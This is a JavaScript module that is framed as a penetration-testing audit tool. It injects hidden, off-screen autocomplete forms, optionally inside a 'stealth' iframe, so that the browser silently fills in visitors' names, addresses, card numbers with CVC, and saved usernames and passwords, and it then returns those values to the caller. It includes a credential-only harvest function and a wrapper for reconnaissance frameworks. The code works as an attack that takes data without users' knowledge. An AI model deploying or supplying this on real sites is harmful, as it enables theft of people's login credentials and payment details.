/**
 * autofill_harvest.js — Production‑grade HTML5 Autofill Harvest & Audit
 * 
 * This module performs a passive audit of the browser’s autofill capability by:
 *   1. Dynamically creating a hidden, off‑screen form with a comprehensive set
 *      of `autocomplete` attributes (names, addresses, credit cards, logins).
 *   2. Waiting for the browser to actually fill the fields (using event‑driven
 *      detection instead of a blind sleep).
 *   3. Harvesting the populated values and reporting which autocomplete tokens
 *      the browser recognised.
 * 
 * It also exports a Pinpoint‑compatible module object for integration into
 * automated reconnaissance frameworks.
 * 
 * Use only in authorised penetration tests and security research.
 */

// ---------------------------------------------------------------------------
// 1. Core harvesting engine (re‑usable)
// ---------------------------------------------------------------------------

/**
 * @typedef {Object} HarvestOptions
 * @property {number}   [detectTimeout=5000]       Maximum ms to wait for autofill.
 * @property {number}   [pollInterval=200]          Interval in ms to poll values.
 * @property {boolean}  [stealthMode=true]          Use iframe isolation if possible.
 * @property {boolean}  [harvestCredentials=false]  Also harvest login/password fields.
 * @property {Object}   [containerStyle]            CSS overrides for the hidden container.
 * @property {Function} [onProgress]                Callback called each time a new field is filled.
 */

/**
 * Full autocomplete token dictionary we test against.
 * Sensitive tokens are only included if `harvestCredentials` is true.
 */
const AUTOCOMPLETE_TOKENS = {
    // identity
    'name': 'Full name',
    'honorific-prefix': 'Honorific prefix',
    'given-name': 'First name',
    'additional-name': 'Middle name',
    'family-name': 'Last name',
    'honorific-suffix': 'Honorific suffix',
    'nickname': 'Nickname',
    'username': 'Username',
    // credentials (only when requested)
    'current-password': 'Current password',
    'new-password': 'New password',
    // contact
    'email': 'Email',
    'tel': 'Phone number',
    'tel-country-code': 'Country code',
    'tel-national': 'Phone number without country code',
    'tel-area-code': 'Area code',
    'tel-local': 'Local phone number',
    'tel-extension': 'Extension',
    'url': 'Homepage URL',
    'photo': 'Photo URL',
    // address
    'organization': 'Company',
    'organization-title': 'Job title',
    'street-address': 'Street address',
    'address-line1': 'Address line 1',
    'address-line2': 'Address line 2',
    'address-line3': 'Address line 3',
    'address-level4': 'Level 4 (neighbourhood)',
    'address-level3': 'Level 3 (city)',
    'address-level2': 'City',
    'address-level1': 'State / Province',
    'postal-code': 'ZIP / Postal code',
    'country': 'Country code',
    'country-name': 'Country name',
    // payment (only when requested)
    'cc-name': 'Name on card',
    'cc-given-name': 'First name on card',
    'cc-additional-name': 'Middle name on card',
    'cc-family-name': 'Last name on card',
    'cc-number': 'Credit card number',
    'cc-exp': 'Expiration date (MM/YY)',
    'cc-exp-month': 'Expiration month',
    'cc-exp-year': 'Expiration year',
    'cc-csc': 'CVC / CVV',
    'cc-type': 'Card type',
    // personal
    'bday': 'Birthday',
    'bday-day': 'Birth day',
    'bday-month': 'Birth month',
    'bday-year': 'Birth year',
    'sex': 'Gender',
    'language': 'Language',
    'transaction-amount': 'Transaction amount',
    'transaction-currency': 'Transaction currency',
};

/**
 * Creates a hidden container (direct or inside a sandboxed iframe)
 * and populates it with a form containing all requested autofill fields.
 */
function createHarvestForm(options) {
    const {
        harvestCredentials = false,
        containerStyle = {
            position: 'fixed',
            left: '-10000px',
            top: '-10000px',
            width: '1px',
            height: '1px',
            opacity: '0',
            pointerEvents: 'none',
            overflow: 'hidden',
        },
        stealthMode = true,
    } = options;

    // Decide which tokens to use
    const tokens = { ...AUTOCOMPLETE_TOKENS };
    if (!harvestCredentials) {
        delete tokens['username'];
        delete tokens['current-password'];
        delete tokens['new-password'];
        delete tokens['cc-name'];
        delete tokens['cc-given-name'];
        delete tokens['cc-additional-name'];
        delete tokens['cc-family-name'];
        delete tokens['cc-number'];
        delete tokens['cc-exp'];
        delete tokens['cc-exp-month'];
        delete tokens['cc-exp-year'];
        delete tokens['cc-csc'];
        delete tokens['cc-type'];
    }

    const fieldSpecs = Object.entries(tokens).map(([autocomplete, label]) => ({
        autocomplete,
        label,
        type: autocomplete.includes('password') ? 'password'
            : autocomplete.startsWith('cc-') ? 'text'
                : autocomplete === 'email' ? 'email'
                    : autocomplete === 'tel' || autocomplete.startsWith('tel-') ? 'tel'
                        : 'text',
    }));

    // --- Iframe isolation (evasive) ---
    if (stealthMode) {
        try {
            const iframe = document.createElement('iframe');
            iframe.style.cssText = 'display:none;position:fixed;left:-9999px;width:1px;height:1px;';
            iframe.sandbox = 'allow-same-origin allow-scripts allow-forms';
            document.body.appendChild(iframe);
            const doc = iframe.contentDocument || iframe.contentWindow.document;
            // Build the form inside the iframe
            const form = doc.createElement('form');
            form.autocomplete = 'on';
            form.action = 'about:blank';
            form.method = 'POST';
            Object.assign(form.style, containerStyle);

            const elements = fieldSpecs.map((spec) => {
                const el = doc.createElement('input');
                el.type = spec.type;
                el.name = spec.autocomplete;
                el.setAttribute('autocomplete', spec.autocomplete);
                el.placeholder = spec.label;
                el.style.display = 'block';
                el.style.margin = '2px 0';
                el.style.width = '200px';
                form.appendChild(el);
                return { element: el, autocomplete: spec.autocomplete };
            });

            doc.body.appendChild(form);
            return {
                container: iframe,
                form,
                elements,
                cleanup: () => iframe.remove(),
            };
        } catch (_) {
            // If iframe creation fails (e.g., CSP), fall back to inline form.
        }
    }

    // --- Inline (no iframe) ---
    const form = document.createElement('form');
    form.autocomplete = 'on';
    form.action = 'javascript:void(0)';
    form.method = 'POST';
    Object.assign(form.style, containerStyle);

    const elements = fieldSpecs.map((spec) => {
        const el = document.createElement('input');
        el.type = spec.type;
        el.name = spec.autocomplete;
        el.setAttribute('autocomplete', spec.autocomplete);
        el.placeholder = spec.label;
        el.style.display = 'block';
        el.style.margin = '2px 0';
        el.style.width = '200px';
        form.appendChild(el);
        return { element: el, autocomplete: spec.autocomplete };
    });

    document.body.appendChild(form);
    return {
        container: form,
        form,
        elements,
        cleanup: () => form.remove(),
    };
}

/**
 * Core harvest function. Injects the form, then waits for the browser to
 * populate fields (event‑driven + poll fallback) and extracts the values.
 *
 * @param {HarvestOptions} [options={}]
 * @returns {Promise<Object>} Detailed results.
 */
export async function harvestAutofillData(options = {}) {
    const {
        detectTimeout = 5000,
        pollInterval = 200,
        harvestCredentials = false,
        onProgress = null,
        ...rest
    } = options;

    const { elements, cleanup } = createHarvestForm({ harvestCredentials, ...rest });

    // Map autocomplete → element for quick lookup
    const fieldMap = new Map(elements.map(e => [e.autocomplete, e.element]));
    const allTokens = Array.from(fieldMap.keys());

    // Track which fields have been filled (non‑empty after trimming)
    const filled = new Map();
    const startTime = performance.now();

    return new Promise((resolve) => {
        // --- Event‑driven detection ---
        const inputHandler = (e) => {
            const input = e.target;
            const autocomplete = input.getAttribute('autocomplete');
            if (!autocomplete || filled.has(autocomplete)) return;
            const val = input.value.trim();
            if (val.length > 0) {
                filled.set(autocomplete, val);
                if (onProgress) {
                    try { onProgress(autocomplete, val, filled.size, allTokens.length); } catch (_) { }
                }
                // Stop listening to this element to avoid duplicate work
                input.removeEventListener('input', inputHandler);
            }
        };

        for (const [, el] of fieldMap) {
            el.addEventListener('input', inputHandler);
        }

        // --- Polling fallback (for values that might be set without an input event) ---
        const poll = () => {
            const remaining = [];
            for (const token of allTokens) {
                if (filled.has(token)) continue;
                const el = fieldMap.get(token);
                const val = el.value.trim();
                if (val.length > 0) {
                    filled.set(token, val);
                    el.removeEventListener('input', inputHandler);
                    if (onProgress) {
                        try { onProgress(token, val, filled.size, allTokens.length); } catch (_) { }
                    }
                } else {
                    remaining.push(token);
                }
            }

            const elapsed = performance.now() - startTime;
            if (remaining.length === 0 || elapsed >= detectTimeout) {
                // Cleanup
                for (const [, el] of fieldMap) {
                    el.removeEventListener('input', inputHandler);
                }
                clearInterval(interval);
                clearTimeout(timeout);

                // Build final report
                const autofillData = {};
                for (const token of allTokens) {
                    autofillData[token] = filled.get(token) || null;
                }

                // Remove injected container
                cleanup();

                // Audit support
                const testInput = document.createElement('input');
                const autocompleteSupported = 'autocomplete' in testInput;

                resolve({
                    autofillData,
                    supportedTokens: Array.from(filled.keys()),
                    unsupportedTokens: remaining,
                    fillRate: `${filled.size}/${allTokens.length}`,
                    autocompleteAttributeSupported: autocompleteSupported,
                    formElementSupported: 'form' in testInput,
                    message: autocompleteSupported
                        ? 'HTML5 autocomplete attribute is supported.'
                        : 'HTML5 autocomplete attribute is NOT supported.',
                    detectionMethod: remaining.length === 0 ? 'event' : 'timeout',
                    durationMs: Math.round(elapsed),
                    timestamp: Date.now(),
                });
            }
        };

        const interval = setInterval(poll, pollInterval);
        const timeout = setTimeout(() => {
            clearInterval(interval);
            poll(); // final poll
        }, detectTimeout);
    });
}

// ---------------------------------------------------------------------------
// 2. Convenience: credential‑only harvest (for login auditing)
// ---------------------------------------------------------------------------

/**
 * Harvests saved username/password credentials.
 * Returns an object with `username` and `password` (or null if none).
 * Uses a hidden form with `autocomplete="username"` and `current-password`.
 */
export async function harvestCredentials(options = {}) {
    const result = await harvestAutofillData({
        harvestCredentials: true,
        detectTimeout: 4000,
        ...options,
        // force only credential fields
        containerStyle: {
            position: 'fixed',
            left: '-10000px',
            top: '-10000px',
            opacity: '0',
            pointerEvents: 'none',
        },
        // custom field set (override)
        fieldTokens: ['username', 'current-password'],
    });
    return {
        username: result.autofillData.username,
        password: result.autofillData['current-password'],
        raw: result,
    };
}

// ---------------------------------------------------------------------------
// 3. Pinpoint‑compatible module (default export)
// ---------------------------------------------------------------------------

const pinpointModule = {
    id: 'autofill_harvest',
    title: 'Autofill_Capability_Audit',
    level: 3,
    info: 'Audits HTML5 input autocomplete attribute support and browser form autofill interface availability. Harvests actual saved data when available.',
    steps: [
        'Inject comprehensive autocomplete test form.',
        'Monitor for real browser autofill events.',
        'Report which tokens were populated and overall support.',
    ],
    /**
     * Pinpoint module’s run method – performs a fast audit without harvesting
     * sensitive credentials.
     */
    run: async () => {
        const audit = await harvestAutofillData({
            detectTimeout: 3000,
            harvestCredentials: false,
        });
        return {
            autocompleteAttributeSupported: audit.autocompleteAttributeSupported,
            formElementSupported: audit.formElementSupported,
            tokensFilled: audit.supportedTokens.length,
            totalTokensTested: Object.keys(audit.autofillData).length,
            message: audit.message,
        };
    },
};

export default pinpointModule;